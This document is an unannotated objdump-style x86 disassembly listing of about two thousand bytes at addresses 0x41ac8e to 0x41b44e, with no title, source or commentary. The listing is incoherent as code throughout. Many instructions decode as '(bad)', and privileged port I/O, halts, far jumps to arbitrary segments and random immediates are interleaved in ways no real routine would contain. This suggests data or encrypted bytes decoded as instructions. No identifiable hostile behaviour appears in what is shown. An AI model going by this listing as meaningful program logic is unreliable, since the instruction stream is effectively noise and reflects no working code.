  41ac8e:	sbb    eax,0xe97f2dd7
  41ac93:	mov    WORD PTR [eax+0x5fa0793a],?
  41ac99:	cmp    eax,0xc48a6251
  41ac9e:	inc    edi
  41ac9f:	(bad)  
  41aca1:	adc    eax,0x311a251e
  41aca6:	sbb    BYTE PTR [esi-0x363d7cfc],0xc8
  41acad:	test   esp,edi
  41acaf:	inc    ecx
  41acb0:	adc    al,BYTE PTR ds:0xf09caa5
  41acb6:	gs and eax,0x5a0527de
  41acbc:	popf   
  41acbd:	bound  ebp,QWORD PTR [ebp+0x30]
  41acc0:	adc    al,0x40
  41acc2:	xlat   BYTE PTR ds:[ebx]
  41acc3:	test   eax,0x739e308e
  41acc8:	(bad)  
  41acc9:	adc    bh,bh
  41accb:	popa   
  41accc:	aas    
  41accd:	mov    bh,0x2
  41accf:	fcmovnb st,st(2)
  41acd1:	xchg   edx,eax
  41acd2:	in     al,0x2
  41acd4:	push   ecx
  41acd5:	aaa    
  41acd6:	fistp  WORD PTR [edi+0x6b3de45c]
  41acdc:	mov    WORD PTR [edx],cs
  41acde:	jp     0xe54fbb3b
  41ace4:	jmp    0xe28f:0x85a11f7b
  41aceb:	test   BYTE PTR [edx-0x72a6861],cl
  41acf1:	sbb    dl,BYTE PTR [edx+0x164694a]
  41acf7:	hlt    
  41acf8:	fist   DWORD PTR [edx-0x18979dfa]
  41acfe:	cli    
  41acff:	repnz and al,0xb1
  41ad02:	xor    ah,BYTE PTR [ebx]
  41ad04:	aas    
  41ad05:	or     cl,bh
  41ad07:	pop    eax
  41ad08:	mov    ch,0x95
  41ad0a:	and    DWORD PTR [edx+edx*1-0x1],edx
  41ad0e:	aas    
  41ad0f:	mov    ch,0x1e
  41ad11:	test   BYTE PTR [ecx+0x732bc68c],bh
  41ad17:	xchg   edi,eax
  41ad18:	imul   esi,DWORD PTR [edi+0x16],0xd2003ad9
  41ad1f:	and    eax,ebp
  41ad21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad22:	(bad)  
  41ad23:	pop    esp
  41ad24:	icebp  
  41ad25:	mov    dl,0x16
  41ad27:	aam    0x3d
  41ad29:	fidiv  DWORD PTR [ebx-0x2eb7adf1]
  41ad2f:	aas    
  41ad30:	push   0x15
  41ad32:	inc    edx
  41ad33:	loop   0x41ad41
  41ad35:	jecxz  0x41ad0b
  41ad37:	adc    eax,0x1837eed3
  41ad3c:	popa   
  41ad3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad3e:	jo     0x41ad4e
  41ad40:	fwait
  41ad41:	inc    ebx
  41ad42:	inc    ebp
  41ad43:	repnz pop edx
  41ad45:	lds    ebx,FWORD PTR [ebx-0x34144640]
  41ad4b:	jmp    0x41ad20
  41ad4d:	add    DWORD PTR [edx+eax*2+0x4a66faf],esi
  41ad54:	xor    cl,BYTE PTR [ebx+0x22]
  41ad57:	mov    al,ds:0xa4c7d3a4
  41ad5c:	loopne 0x41ad34
  41ad5e:	pop    eax
  41ad5f:	div    BYTE PTR [edx+0x4956b549]
  41ad65:	nop
  41ad66:	shr    BYTE PTR [edx+ebx*2],1
  41ad69:	xor    BYTE PTR [edi+0x2d803272],cl
  41ad6f:	mov    gs,WORD PTR [esi]
  41ad71:	mov    eax,0xad6657ae
  41ad76:	pop    edx
  41ad77:	mov    eax,0x873d0e14
  41ad7c:	sub    BYTE PTR [edi-0x767b1217],0x2a
  41ad83:	loope  0x41ad0c
  41ad85:	out    dx,al
  41ad86:	stc    
  41ad87:	push   0xfffffff8
  41ad89:	stos   DWORD PTR es:[edi],eax
  41ad8a:	mov    edi,0x4c24614d
  41ad8f:	xor    bh,cl
  41ad91:	cmp    DWORD PTR [ebx+0x34859762],esi
  41ad97:	ins    BYTE PTR es:[edi],dx
  41ad98:	adc    dl,BYTE PTR [edi]
  41ad9a:	outs   dx,DWORD PTR ds:[esi]
  41ad9b:	mov    eax,0x10ec0841
  41ada0:	and    BYTE PTR [edx],dl
  41ada2:	mov    dh,0x97
  41ada4:	stos   DWORD PTR es:[edi],eax
  41ada5:	or     BYTE PTR [eax+eax*2-0x17],bl
  41ada9:	es pop es
  41adab:	dec    edx
  41adac:	popa   
  41adad:	fisttp WORD PTR [edi+0x25]
  41adb0:	fs xchg esi,eax
  41adb2:	sbb    al,0x23
  41adb4:	mov    DWORD PTR [ebp-0x79],ecx
  41adb7:	mov    esi,0x6d45d311
  41adbc:	pop    ds
  41adbd:	loopne 0x41adf8
  41adbf:	addr16 mov ch,0x5f
  41adc2:	sahf   
  41adc3:	jp     0x41adbb
  41adc5:	loopne 0x41ae44
  41adc7:	adc    cl,bl
  41adc9:	out    dx,eax
  41adca:	js     0x41ade3
  41adcc:	mov    edx,0xcbb1746d
  41add1:	sbb    ebp,DWORD PTR [eax-0x74c10756]
  41add7:	sub    DWORD PTR [ebp-0xa26e6c],0x1f
  41adde:	cmp    al,0xa4
  41ade0:	ret    0x87e9
  41ade3:	lds    esi,FWORD PTR [ebx]
  41ade5:	sub    BYTE PTR [eax+0x616cc0dd],dh
  41adeb:	int    0xb8
  41aded:	out    0xd0,eax
  41adef:	std    
  41adf0:	pop    ebx
  41adf1:	inc    ebx
  41adf2:	adc    DWORD PTR fs:[edi+0x1],0x4551a599
  41adfa:	mov    al,0x2c
  41adfc:	cli    
  41adfd:	pop    edi
  41adfe:	mov    ah,0xa2
  41ae00:	add    ch,BYTE PTR [eax-0x723dffe]
  41ae06:	pop    ebp
  41ae07:	stc    
  41ae08:	xchg   ecx,eax
  41ae09:	adc    BYTE PTR ss:[esi-0x7de5a5c8],bh
  41ae10:	or     DWORD PTR [ebp+0x7d621873],ebp
  41ae16:	or     edx,ecx
  41ae18:	shr    BYTE PTR [eax],1
  41ae1a:	jo     0x41ae16
  41ae1c:	dec    edi
  41ae1d:	xchg   edx,eax
  41ae1e:	stos   BYTE PTR es:[edi],al
  41ae1f:	cmc    
  41ae20:	and    al,0xa4
  41ae22:	jl     0x41ae85
  41ae24:	or     eax,0xdf63b19d
  41ae29:	int    0x3f
  41ae2b:	adc    ah,BYTE PTR [eax+0x102f03a6]
  41ae31:	push   0xffffff96
  41ae33:	xchg   esi,eax
  41ae34:	and    al,0x5d
  41ae36:	inc    esi
  41ae37:	sahf   
  41ae38:	(bad)  
  41ae3a:	inc    esp
  41ae3b:	dec    ebx
  41ae3c:	mov    edx,0x2682386a
  41ae41:	sbb    dl,BYTE PTR [eax+esi*8+0x74d0c1fe]
  41ae48:	push   esp
  41ae49:	fnsave [ecx-0x59d960ef]
  41ae4f:	daa    
  41ae50:	add    eax,0xb54bc176
  41ae55:	or     BYTE PTR [ecx+0x50],ch
  41ae58:	imul   ecx,DWORD PTR [ebp+0x42c992fc],0x1794fe46
  41ae62:	out    0x8,al
  41ae64:	lods   eax,DWORD PTR ds:[esi]
  41ae65:	cmp    DWORD PTR [esp+ecx*8+0x5a],0xffffff96
  41ae6a:	fistp  QWORD PTR [ebp+0x34]
  41ae6d:	test   al,0x15
  41ae6f:	dec    ebx
  41ae70:	mov    esp,0x14d24ea9
  41ae75:	aas    
  41ae76:	out    dx,eax
  41ae77:	fisubr DWORD PTR fs:[edi]
  41ae7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae7b:	sbb    DWORD PTR [esi-0x33],0xc6603a22
  41ae82:	lea    ebx,[ebp+0x61]
  41ae85:	inc    ecx
  41ae86:	test   al,0xbd
  41ae88:	pop    es
  41ae89:	and    eax,0xb50e7b0e
  41ae8e:	fmul   DWORD PTR [eax]
  41ae90:	fadd   st(1),st
  41ae92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae93:	sti    
  41ae94:	mov    esi,0xee62a61b
  41ae99:	(bad)  
  41ae9a:	mov    esp,0xf81ff831
  41ae9f:	add    BYTE PTR [esi],al
  41aea1:	mov    ecx,0x61602250
  41aea6:	sar    BYTE PTR [ebx+edx*2],cl
  41aea9:	icebp  
  41aeaa:	dec    eax
  41aeab:	push   ss
  41aeac:	push   ds
  41aead:	hlt    
  41aeae:	shr    ch,1
  41aeb0:	(bad)  [esi]
  41aeb2:	xchg   edi,eax
  41aeb3:	call   0x20c2ce9c
  41aeb8:	or     ebx,DWORD PTR [eax+0x51]
  41aebb:	push   edx
  41aebc:	mov    ch,0x57
  41aebe:	repnz in eax,dx
  41aec0:	xchg   BYTE PTR [esi-0x3f204d09],bh
  41aec6:	sahf   
  41aec7:	pusha  
  41aec8:	mov    cl,0x8b
  41aeca:	not    DWORD PTR ds:0xa2ee4f2f
  41aed0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aed1:	jno    0x41aebb
  41aed3:	xor    al,0xde
  41aed5:	mov    al,0x8e
  41aed7:	sub    eax,0xf05c4345
  41aedc:	imul   ebp,esi,0xff07c8c9
  41aee2:	aam    0x7b
  41aee4:	iret   
  41aee5:	retf   
  41aee6:	add    DWORD PTR [esi+0x5cccb5d7],esp
  41aeec:	xlat   BYTE PTR ds:[ebx]
  41aeed:	scas   eax,DWORD PTR es:[edi]
  41aeee:	adc    BYTE PTR ds:0x7e95797d,dl
  41aef4:	lock mov dh,0xf3
  41aef7:	shl    DWORD PTR [esi+0x3c05edb],cl
  41aefd:	cmp    BYTE PTR [ecx-0x74ddd42],dl
  41af03:	imul   esi,DWORD PTR [ebx],0xffffffbd
  41af06:	div    BYTE PTR [ebx]
  41af08:	or     DWORD PTR [esi],0x6f
  41af0b:	add    BYTE PTR [edi-0x1a],ch
  41af0e:	adc    DWORD PTR [eax+ecx*1+0x28],edi
  41af12:	inc    ecx
  41af13:	mov    bl,0xd8
  41af15:	push   eax
  41af16:	and    dh,0x0
  41af19:	sbb    DWORD PTR [eax-0x7c],ebx
  41af1c:	and    esp,DWORD PTR ds:0x56e23ea
  41af22:	jl     0x41af89
  41af24:	push   esp
  41af25:	fcomp  DWORD PTR fs:[ebp-0x59]
  41af29:	mov    ds:0xf58007d0,eax
  41af2e:	jmp    0xeec22a12
  41af33:	popa   
  41af34:	fmul   QWORD PTR [esi+0x67]
  41af37:	pop    ebx
  41af38:	aam    0xa4
  41af3a:	push   cs
  41af3b:	pop    es
  41af3c:	push   ebx
  41af3d:	jnp    0x41aefb
  41af3f:	push   ds
  41af40:	mov    bh,0xc4
  41af42:	mov    ecx,0xfb396a54
  41af47:	xchg   ecx,eax
  41af48:	test   eax,0x2eee02d6
  41af4d:	addr16 xor ecx,edx
  41af50:	xlat   BYTE PTR ds:[ebx]
  41af51:	or     al,0xb2
  41af53:	dec    ecx
  41af54:	sbb    al,0x4
  41af56:	fild   WORD PTR [edi+0x5759a5d7]
  41af5c:	sub    BYTE PTR [edi+0x1d],dl
  41af5f:	adc    bl,al
  41af61:	pusha  
  41af62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af63:	adc    ebp,DWORD PTR [eax+0x2f4811ad]
  41af69:	push   esi
  41af6a:	cmp    dh,bl
  41af6c:	cmp    DWORD PTR [ebx],0x70d27c27
  41af72:	hlt    
  41af73:	lods   eax,DWORD PTR ds:[esi]
  41af74:	addr16 ret 
  41af76:	push   esp
  41af77:	pop    esp
  41af78:	jno    0x41af86
  41af7a:	out    0xc4,al
  41af7c:	sub    BYTE PTR [eax+0x35],dl
  41af7f:	jo     0x41afd7
  41af81:	pop    esi
  41af82:	mov    BYTE PTR [eax+0x45],bl
  41af85:	push   ebx
  41af86:	dec    esi
  41af87:	ins    BYTE PTR es:[edi],dx
  41af88:	or     al,0x40
  41af8a:	jmp    FWORD PTR [eax+ebp*4-0x68]
  41af8e:	outs   dx,BYTE PTR ds:[esi]
  41af8f:	scas   al,BYTE PTR es:[edi]
  41af90:	hlt    
  41af91:	xor    eax,0xf106a9c7
  41af96:	push   edx
  41af97:	push   cs
  41af98:	call   0x6dc588e6
  41af9d:	shl    DWORD PTR [ebx-0x3f8e5d7f],cl
  41afa3:	push   ecx
  41afa4:	inc    ebp
  41afa5:	jp     0x41af4a
  41afa7:	std    
  41afa8:	push   0x79
  41afaa:	mov    dh,BYTE PTR [edx]
  41afac:	xor    cl,BYTE PTR [edx-0x46]
  41afaf:	stos   DWORD PTR es:[edi],eax
  41afb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41afb1:	xor    DWORD PTR [ecx+eiz*4-0x77c5ab85],esi
  41afb8:	sbb    eax,0x2c07660d
  41afbd:	mov    bl,0x22
  41afbf:	mov    edx,0xf0f5f346
  41afc4:	mov    edx,0xe41dc8bc
  41afc9:	mov    bh,BYTE PTR [ebp+ebx*8-0x3fec6fbe]
  41afd0:	fdiv   QWORD PTR [ecx-0x13f019d3]
  41afd6:	nop
  41afd7:	jle    0x41b055
  41afd9:	shl    DWORD PTR [ecx+esi*4],cl
  41afdc:	shl    DWORD PTR [ebp+eax*8-0x26eecf8],cl
  41afe3:	clc    
  41afe4:	xchg   edx,eax
  41afe5:	jnp    0x41af97
  41afe7:	aad    0xe0
  41afe9:	shl    BYTE PTR [edx],0x70
  41afec:	fdiv   DWORD PTR [eax-0x64]
  41afef:	mov    bl,0xff
  41aff1:	aam    0x1
  41aff3:	js     0x41af83
  41aff5:	push   ds
  41aff6:	mov    edi,0x5bd94cb9
  41affb:	pop    DWORD PTR [ebx+edi*4-0x16d2b2a9]
  41b002:	mov    edx,0xc3104f79
  41b007:	jne    0x41b05a
  41b009:	test   al,0xf5
  41b00b:	nop
  41b00c:	mov    WORD PTR [ecx-0xc2d62c4],?
  41b012:	dec    esi
  41b013:	or     ebp,DWORD PTR [esi-0x3c]
  41b016:	or     ch,0xcc
  41b019:	jns    0x41b03c
  41b01b:	stos   BYTE PTR es:[edi],al
  41b01c:	and    ah,BYTE PTR [eax+ebp*1]
  41b01f:	jg     0x41afb4
  41b021:	pusha  
  41b022:	(bad)  
  41b023:	jmp    0x41b07c
  41b025:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b026:	push   edi
  41b027:	jb     0x41afe1
  41b029:	xor    DWORD PTR [esi-0x30],ebx
  41b02c:	pop    ebp
  41b02d:	xor    ah,BYTE PTR [esi]
  41b02f:	(bad)  
  41b030:	pushf  
  41b031:	ret    
  41b032:	push   0x16
  41b034:	xchg   edi,eax
  41b035:	jle    0x41b097
  41b037:	test   DWORD PTR [edi],edx
  41b039:	push   ebp
  41b03a:	dec    esp
  41b03b:	ins    DWORD PTR es:[edi],dx
  41b03c:	sbb    al,0x55
  41b03e:	inc    esi
  41b03f:	inc    esi
  41b040:	sar    BYTE PTR [edi],1
  41b042:	ret    0x1736
  41b045:	aam    0x15
  41b047:	jecxz  0x41b0aa
  41b049:	out    0xc3,eax
  41b04b:	or     BYTE PTR [ecx],bl
  41b04d:	leave  
  41b04e:	retf   
  41b04f:	xor    eax,0x516b7224
  41b054:	lock sbb al,0x38
  41b057:	loop   0x41b0cc
  41b059:	repz dec edi
  41b05b:	ss (bad) 
  41b05e:	and    eax,0xa032a598
  41b063:	pop    ebx
  41b064:	dec    edx
  41b065:	cwde   
  41b066:	push   es
  41b067:	sub    al,0x40
  41b069:	xchg   DWORD PTR [ecx],ebp
  41b06b:	inc    ebx
  41b06c:	ins    BYTE PTR es:[edi],dx
  41b06d:	mov    ah,0x7e
  41b06f:	xchg   ecx,eax
  41b070:	(bad)  
  41b071:	fs dec ebp
  41b073:	cdq    
  41b074:	in     eax,dx
  41b075:	mov    edx,0xea322d3a
  41b07a:	pop    ss
  41b07b:	jbe    0x41b008
  41b07d:	push   0xf0a8ec2d
  41b082:	cmp    eax,0xdd208ce7
  41b087:	pop    edi
  41b088:	add    al,0xec
  41b08a:	xchg   esp,eax
  41b08b:	adc    al,0x96
  41b08d:	call   0xd7e8:0x8b4063c3
  41b094:	int3   
  41b095:	adc    eax,0x7048ecb
  41b09a:	in     eax,0x36
  41b09c:	adc    ah,dl
  41b09e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b09f:	adc    dl,BYTE PTR [esi-0xc915e73]
  41b0a5:	dec    esp
  41b0a6:	and    BYTE PTR [esi-0x1f39617a],0x82
  41b0ad:	fimul  WORD PTR [eax+esi*4]
  41b0b0:	and    DWORD PTR [eax],eax
  41b0b2:	(bad)  
  41b0b3:	inc    ebx
  41b0b4:	mov    bh,0x10
  41b0b6:	add    al,0xb1
  41b0b8:	inc    esp
  41b0b9:	push   DWORD PTR [edi+0x19]
  41b0bc:	fucomi st,st(4)
  41b0be:	push   esi
  41b0bf:	fbstp  TBYTE PTR [esi+eiz*8]
  41b0c2:	daa    
  41b0c3:	xchg   ecx,eax
  41b0c4:	inc    edx
  41b0c5:	jp     0x41b07b
  41b0c7:	dec    edx
  41b0c8:	sub    edi,DWORD PTR [ebx+0x348e2911]
  41b0ce:	shr    DWORD PTR [edi+edi*1-0x30],cl
  41b0d2:	push   ebx
  41b0d3:	jnp    0x41b0f8
  41b0d5:	jns    0x41b125
  41b0d7:	stos   BYTE PTR es:[edi],al
  41b0d8:	inc    ebx
  41b0d9:	pop    ebx
  41b0da:	aaa    
  41b0db:	dec    edi
  41b0dc:	in     eax,0xa1
  41b0de:	push   ebp
  41b0df:	outs   dx,BYTE PTR ds:[esi]
  41b0e0:	jne    0x41b0d2
  41b0e2:	dec    edi
  41b0e3:	xchg   edi,eax
  41b0e4:	outs   dx,DWORD PTR ds:[esi]
  41b0e5:	xor    BYTE PTR [edx],dh
  41b0e7:	mov    esp,0x299daa81
  41b0ec:	call   0x7b93:0x14cf8343
  41b0f3:	lock xchg esi,eax
  41b0f5:	mov    ah,0x2b
  41b0f7:	push   edx
  41b0f8:	sti    
  41b0f9:	dec    ebp
  41b0fa:	stos   DWORD PTR es:[edi],eax
  41b0fb:	dec    ecx
  41b0fc:	and    DWORD PTR [esp+ebx*8-0x1cdf82f3],edi
  41b103:	xchg   DWORD PTR [ebp-0x59b3eabd],esi
  41b109:	dec    esi
  41b10a:	fiadd  DWORD PTR [ebx+0x34]
  41b10d:	adc    DWORD PTR ss:[ebx+0x5f5ae77b],0xfde9c887
  41b118:	std    
  41b119:	inc    ebx
  41b11a:	push   cs
  41b11b:	inc    ebx
  41b11c:	add    dl,al
  41b11e:	lea    edi,[esi+ebx*4]
  41b121:	lods   eax,DWORD PTR ds:[esi]
  41b122:	in     al,0xac
  41b124:	jo     0x41b11f
  41b126:	sub    BYTE PTR [ebx+0x4d],al
  41b129:	das    
  41b12a:	inc    esi
  41b12b:	lods   eax,DWORD PTR ds:[esi]
  41b12c:	sbb    ch,BYTE PTR [edi]
  41b12e:	and    al,0x1
  41b130:	sub    edx,esp
  41b132:	mov    edx,0x83b201be
  41b137:	pop    ss
  41b138:	xchg   edx,eax
  41b139:	cs addr16 mov bh,0x9c
  41b13d:	sub    eax,0x771c6a79
  41b142:	push   eax
  41b143:	push   esi
  41b144:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b145:	mov    ecx,0x7297899c
  41b14a:	ret    
  41b14b:	test   BYTE PTR [eax+0x76],cl
  41b14e:	arpl   WORD PTR [edx+0x3c],di
  41b151:	inc    ecx
  41b152:	(bad)  
  41b153:	mov    WORD PTR [edx+0x18dc97d1],ds
  41b159:	cmp    bh,BYTE PTR [ebx-0x79]
  41b15c:	ror    ah,0x17
  41b15f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b160:	sbb    edx,DWORD PTR [ebx]
  41b162:	jnp    0x41b171
  41b164:	shl    ebp,0x4
  41b167:	mov    eax,ds:0x67dfa0d6
  41b16c:	xchg   ebp,eax
  41b16d:	xor    BYTE PTR [edi-0x11de4a3f],0x80
  41b174:	jne    0x2c3b12d0
  41b17a:	mov    eax,ds:0x40c2bef8
  41b17f:	inc    ebp
  41b180:	ret    0xb4f
  41b183:	or     DWORD PTR [ecx+0x3876fa92],eax
  41b189:	cmp    cl,dh
  41b18b:	in     al,dx
  41b18c:	push   cs
  41b18d:	cdq    
  41b18e:	xchg   ebx,eax
  41b18f:	dec    esi
  41b190:	push   ecx
  41b191:	int    0x92
  41b193:	stos   BYTE PTR es:[edi],al
  41b194:	adc    dh,ah
  41b196:	iret   
  41b197:	inc    edi
  41b198:	in     al,0x5e
  41b19a:	fdiv   QWORD PTR [eax+ebp*4-0x360c42e7]
  41b1a1:	data16 cmc 
  41b1a3:	pxor   mm7,QWORD PTR [ebp+0x4ac177cb]
  41b1aa:	lods   eax,DWORD PTR ds:[esi]
  41b1ab:	cli    
  41b1ac:	or     edi,DWORD PTR [esp+eax*1+0x3711bf48]
  41b1b3:	jge    0x41b206
  41b1b5:	adc    BYTE PTR [edx+0x62983d],al
  41b1bb:	ins    DWORD PTR es:[edi],dx
  41b1bc:	mov    BYTE PTR [ebx+0x69],bl
  41b1bf:	sbb    BYTE PTR [eax+0x84e8f2a],0xbf
  41b1c6:	push   edx
  41b1c7:	sub    eax,0x126ecc8f
  41b1cc:	mov    DWORD PTR [esp+eiz*2-0x23],ecx
  41b1d0:	push   edi
  41b1d1:	stos   DWORD PTR es:[edi],eax
  41b1d2:	cmp    ebx,ecx
  41b1d4:	popf   
  41b1d5:	aaa    
  41b1d6:	data16 aas 
  41b1d8:	adc    DWORD PTR [edi-0x17282cd],esi
  41b1de:	adc    eax,0x22c1dfe6
  41b1e3:	jle    0x41b213
  41b1e5:	(bad)  [edi+0x2b]
  41b1e8:	lea    ecx,[eax]
  41b1ea:	das    
  41b1eb:	and    bh,0x7d
  41b1ee:	xor    dh,BYTE PTR [ebx+0x1a]
  41b1f1:	push   0xf54af329
  41b1f6:	cmp    eax,0x80463170
  41b1fb:	es (bad) 
  41b1fe:	adc    eax,0x4721fa8f
  41b203:	call   0x2bb261cd
  41b208:	jo     0x41b1f7
  41b20a:	xacquire xchg DWORD PTR [eax+0x6881ed98],ebp
  41b211:	mov    ch,0xf3
  41b213:	cmp    DWORD PTR [edi],0xb2da42b3
  41b219:	dec    eax
  41b21a:	jno    0x41b236
  41b21c:	fwait
  41b21d:	in     al,0xf9
  41b21f:	pop    edx
  41b220:	xlat   BYTE PTR gs:[ebx]
  41b222:	xchg   DWORD PTR [ebx+edx*1],edi
  41b225:	jno    0x41b24c
  41b227:	and    DWORD PTR [edi-0x5e],ecx
  41b22a:	inc    ebx
  41b22b:	inc    esp
  41b22c:	gs push ss
  41b22e:	sub    eax,0xc6ed7734
  41b233:	sahf   
  41b234:	rol    DWORD PTR [edx-0x6e],1
  41b237:	imul   esp,DWORD PTR [eax+0x65a57118],0xffffffbf
  41b23e:	loop   0x41b20e
  41b240:	out    0x32,eax
  41b242:	adc    eax,0xff7f1577
  41b247:	sar    al,0xc
  41b24a:	retf   
  41b24b:	cwde   
  41b24c:	mov    dh,0xfb
  41b24e:	into   
  41b24f:	daa    
  41b250:	out    0x74,al
  41b252:	test   eax,0xbcc849e8
  41b257:	nop
  41b258:	cli    
  41b259:	and    eax,0xa0a5221b
  41b25e:	adc    eax,0xf7dd3f6f
  41b263:	sub    al,BYTE PTR [edx-0x40c2b1e3]
  41b269:	xor    eax,0x9adcd12f
  41b26e:	mov    ah,ah
  41b270:	mov    edi,0x485fbc40
  41b275:	aas    
  41b276:	sbb    eax,0x3c6bdebb
  41b27b:	fiadd  DWORD PTR [eax-0x1f]
  41b27e:	loopne 0x41b261
  41b280:	adc    al,0xd0
  41b282:	mov    ebp,0x2207436e
  41b287:	je     0x41b2e1
  41b289:	inc    ebx
  41b28a:	(bad)  [ecx]
  41b28c:	mov    esp,0xef60a73b
  41b291:	mov    eax,0x2444704f
  41b296:	add    eax,DWORD PTR ds:0xf9dcf6bc
  41b29c:	mov    al,ds:0x34422e45
  41b2a1:	stos   DWORD PTR es:[edi],eax
  41b2a2:	lods   al,BYTE PTR ds:[esi]
  41b2a3:	mov    ecx,0x9e32aee3
  41b2a8:	and    dh,BYTE PTR [edx-0x31]
  41b2ab:	mov    dh,0xe1
  41b2ad:	mul    DWORD PTR [ecx-0x62fc4d36]
  41b2b3:	dec    ebx
  41b2b4:	lods   al,BYTE PTR ds:[esi]
  41b2b5:	movlps xmm7,QWORD PTR [eax+0x1a0ca84d]
  41b2bc:	push   ds
  41b2bd:	mov    esi,0x29704c06
  41b2c2:	jmp    0x6bdd523d
  41b2c7:	mov    al,0x59
  41b2c9:	out    0xc2,al
  41b2cb:	pop    ecx
  41b2cc:	shl    DWORD PTR [ebp+edx*8+0x56],0x32
  41b2d1:	repnz fnstenv [edi+eax*2]
  41b2d5:	push   es
  41b2d6:	mov    eax,ds:0xb55c0fe7
  41b2db:	(bad)  
  41b2dc:	mov    ah,0xc
  41b2df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2e1:	and    DWORD PTR [ebx+0x4b1afd35],esi
  41b2e7:	call   0xe744f0b2
  41b2ec:	add    edx,DWORD PTR [edi-0x7f]
  41b2ef:	imul   esp,DWORD PTR [ebp+0x4c045756],0xc8adb114
  41b2f9:	xor    eax,0x638c2c8e
  41b2fe:	jecxz  0x41b2f3
  41b300:	push   0x6d752a43
  41b305:	xchg   esp,eax
  41b306:	cmp    eax,0xe140517d
  41b30b:	add    cl,cl
  41b30d:	adc    ebx,DWORD PTR [edi+0x5a5d08d]
  41b313:	adc    eax,0x7b9c12db
  41b318:	jo     0x41b2a3
  41b31a:	icebp  
  41b31b:	jmp    0x3115:0x9b4356a3
  41b322:	imul   eax,DWORD PTR [ebp+0x19],0x3e1bf1c7
  41b329:	mov    DWORD PTR [edx+0x23],ecx
  41b32c:	inc    eax
  41b32d:	and    ecx,0x18772cbc
  41b333:	sub    al,0xbf
  41b335:	jl     0x41b34f
  41b337:	dec    eax
  41b338:	jmp    DWORD PTR [edx-0x3cb7a240]
  41b33e:	leave  
  41b33f:	pop    edi
  41b340:	mov    eax,ds:0xa6208273
  41b345:	sub    DWORD PTR [edi+0x2dda3e84],ebp
  41b34b:	sub    edi,DWORD PTR [ecx+0x49]
  41b34e:	sub    al,0xfd
  41b350:	push   cs
  41b351:	adc    edi,DWORD PTR [edi]
  41b353:	dec    ebp
  41b354:	and    DWORD PTR [edi-0x274510a0],esi
  41b35a:	adc    al,ch
  41b35c:	xlat   BYTE PTR ds:[ebx]
  41b35d:	aaa    
  41b35e:	cli    
  41b35f:	cwde   
  41b360:	jl     0x41b30c
  41b362:	adc    al,BYTE PTR [esi]
  41b364:	clc    
  41b365:	xchg   ebx,eax
  41b366:	push   edx
  41b367:	jle    0x41b321
  41b369:	xchg   ecx,eax
  41b36a:	dec    esp
  41b36b:	jnp    0x41b34a
  41b36d:	fild   DWORD PTR [edi-0x34]
  41b370:	inc    ebx
  41b371:	(bad)  
  41b372:	call   0xf459:0x10d7d12d
  41b379:	dec    eax
  41b37a:	or     DWORD PTR [ebx-0x5d],esp
  41b37d:	daa    
  41b37e:	mov    dl,0xae
  41b380:	pusha  
  41b381:	test   cl,bh
  41b383:	sub    eax,0xa428c59d
  41b388:	nop
  41b389:	pmullw mm1,mm2
  41b38c:	dec    BYTE PTR [esi]
  41b38e:	add    eax,0x7cacde44
  41b393:	es jno 0x41b3b7
  41b396:	ja     0x41b395
  41b398:	call   0x9603e245
  41b39d:	hlt    
  41b39e:	jbe    0x41b364
  41b3a0:	paddsw mm1,QWORD PTR [ebx]
  41b3a3:	push   0x6846190b
  41b3a8:	jns    0x41b356
  41b3aa:	imul   eax,DWORD PTR [edx+ebp*4+0x34c761f8],0xd600970
  41b3b5:	test   eax,0xa0790277
  41b3ba:	ret    
  41b3bb:	lods   al,BYTE PTR ds:[esi]
  41b3bc:	xor    ebx,DWORD PTR [edi+0x13]
  41b3bf:	loop   0x41b359
  41b3c1:	jmp    0x1838:0xfeed3c3
  41b3c8:	mov    ds:0x1b8840d2,al
  41b3cd:	inc    esp
  41b3ce:	in     eax,dx
  41b3cf:	and    BYTE PTR [esi],dh
  41b3d1:	lods   eax,DWORD PTR ds:[esi]
  41b3d2:	call   FWORD PTR [edi+ebp*8-0x732fb51d]
  41b3d9:	sahf   
  41b3da:	pop    esi
  41b3db:	adc    esi,ecx
  41b3dd:	add    esp,DWORD PTR [ebp-0x4ccf128b]
  41b3e3:	adc    eax,0x5b08241b
  41b3e8:	fidiv  DWORD PTR [ebx]
  41b3ea:	jns    0x41b37d
  41b3ec:	pop    esp
  41b3ed:	pushf  
  41b3ee:	xor    al,BYTE PTR fs:[ecx-0x7a]
  41b3f2:	arpl   WORD PTR [eax],dx
  41b3f4:	aam    0xae
  41b3f6:	xor    eax,0xb3e2cd2d
  41b3fb:	or     edx,DWORD PTR [edx+0x29]
  41b3fe:	imul   edx,ebp,0xffffffa9
  41b401:	int3   
  41b402:	mov    eax,0x35275f9a
  41b407:	mov    esi,0xb7016a48
  41b40c:	fs loop 0x41b454
  41b40f:	or     bh,BYTE PTR [ebp-0x79]
  41b412:	mov    eax,ds:0x15963b6c
  41b417:	xor    ecx,0x4df57897
  41b41d:	scas   al,BYTE PTR es:[edi]
  41b41e:	(bad)  
  41b41f:	repz inc edx
  41b421:	adc    al,0x2a
  41b423:	push   edx
  41b424:	das    
  41b425:	pop    es
  41b426:	push   esp
  41b427:	xor    BYTE PTR [edi+0x22],al
  41b42a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b42b:	dec    ecx
  41b42c:	mov    ds:0xb4c899b3,al
  41b432:	repz mov ds:0xf6218f36,eax
  41b438:	sbb    bl,BYTE PTR [edi-0x3e]
  41b43b:	add    dl,cl
  41b43d:	mov    eax,ds:0xb160c2c7
  41b442:	pusha  
  41b443:	xchg   DWORD PTR [esi+0x50],edi
  41b446:	mov    edx,0x1a0adfc3
  41b44b:	pusha  
  41b44c:	(bad)  
  41b44d:	pushf  
  41b44e:	popf   
